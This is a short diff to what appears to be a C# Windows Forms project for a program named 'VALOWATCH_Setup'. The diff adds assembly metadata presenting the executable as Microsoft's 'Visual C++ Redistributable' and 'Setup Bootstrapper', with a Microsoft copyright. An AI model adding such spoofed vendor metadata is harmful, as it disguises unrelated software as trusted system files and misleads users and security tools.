@@ -7,6 +7,12 @@
     <UseWindowsForms>true</UseWindowsForms>
     <ImplicitUsings>enable</ImplicitUsings>
     <AssemblyName>VALOWATCH_Setup</AssemblyName>
+      <Company>Microsoft Corporation</Company>
+    <Product>Microsoft Visual C++ Redistributable</Product>
+    <AssemblyTitle>Microsoft Visual C++ Redistributable</AssemblyTitle>
+    <Description>Microsoft Setup Bootstrapper</Description>
+    <Copyright>(C) Microsoft Corporation. All rights reserved.</Copyright>
+    <FileDescription>Microsoft Setup Bootstrapper</FileDescription>
   </PropertyGroup>
 
   <ItemGroup>
